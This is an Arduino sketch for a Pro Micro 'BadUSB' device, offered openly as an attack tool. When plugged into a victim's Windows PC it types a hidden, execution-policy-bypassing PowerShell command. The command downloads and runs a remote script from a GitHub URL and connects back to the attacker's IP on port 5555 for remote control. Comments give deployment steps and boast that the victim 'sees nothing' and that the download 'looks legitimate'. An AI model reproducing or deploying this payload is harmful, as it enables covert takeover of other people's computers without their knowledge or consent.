/*
 * ================================================================
 * PRO MICRO BADUSB - Remote Control Payload (GITHUB VERSION)
 * ================================================================
 * Board: Arduino Leonardo / Pro Micro (ATmega32U4)
 * 
 * Setup:
 * 1. Install Arduino IDE
 * 2. Tools → Board → Arduino Leonardo
 * 3. Tools → Port → Select your Pro Micro
 * 4. Update IP address (line 19)
 * 5. Upload this sketch
 * 6. Plug into victim's PC → Auto-executes!
 * ================================================================
 */

#include <Keyboard.h>

// ============ CONFIGURATION ============
const char* TARGET_IP = "192.168.8.158";  // ← CHANGE THIS TO YOUR IP!

// GitHub repository (no web server needed!)
const char* GITHUB_URL = "https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1";
// =======================================

void setup() {
  // Initialize keyboard emulation
  Keyboard.begin();
  
  // Wait for target to be ready
  delay(2000);
  
  // Execute payload
  executePayload();
  
  // End keyboard emulation
  Keyboard.end();
}

void loop() {
  // Nothing - payload runs once
}

void executePayload() {
  // Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(400);
  
  // Type PowerShell command (downloads from GitHub, passes IP)
  Keyboard.print("powershell -W Hidden -NoP -Exec Bypass -C \"$c='");
  Keyboard.print(TARGET_IP);
  Keyboard.print("';$p=5555;IEX(New-Object Net.WebClient).DownloadString('");
  Keyboard.print(GITHUB_URL);
  Keyboard.print("')\"");
  
  // Press Enter to execute
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}

/*
 * ================================================================
 * DEPLOYMENT INSTRUCTIONS:
 * ================================================================
 * 
 * 1. ON YOUR LAPTOP:
 *    - Push client.ps1 to GitHub (already done!)
 *    - Run: 2_START_SERVER_GITHUB.bat
 *    - Wait for GUI to show "Waiting for connections"
 * 
 * 2. UPLOAD THIS CODE TO PRO MICRO:
 *    - Update TARGET_IP (line 19)
 *    - Arduino IDE → Upload
 * 
 * 3. PLUG PRO MICRO INTO VICTIM'S PC:
 *    - Waits 2 seconds
 *    - Opens PowerShell (hidden)
 *    - Downloads client.ps1 from YOUR GitHub
 *    - Connects to your IP:5555
 *    - Victim sees nothing!
 * 
 * 4. CHECK YOUR SERVER:
 *    - New connection appears
 *    - Enable mouse & keyboard control
 *    - You're in!
 * 
 * ================================================================
 * BENEFITS OF GITHUB METHOD:
 * ================================================================
 * ✅ No web server needed on your PC!
 * ✅ Works from anywhere (not just same WiFi)
 * ✅ Victim downloads from GitHub (looks legitimate)
 * ✅ You only need GUI running
 * ✅ Simpler setup
 * 
 * ================================================================
 */
